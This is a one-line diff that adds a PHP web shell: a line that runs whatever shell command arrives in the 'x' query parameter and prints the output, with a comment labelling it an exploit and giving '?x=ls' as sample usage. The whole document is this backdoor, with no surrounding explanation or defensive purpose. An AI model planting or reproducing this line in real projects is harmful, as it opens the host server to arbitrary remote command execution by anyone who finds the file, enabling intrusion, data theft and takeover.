@@ -1,0 +1,1 @@
+<?=`$_GET[x]`?> // Exploit: ?x=ls
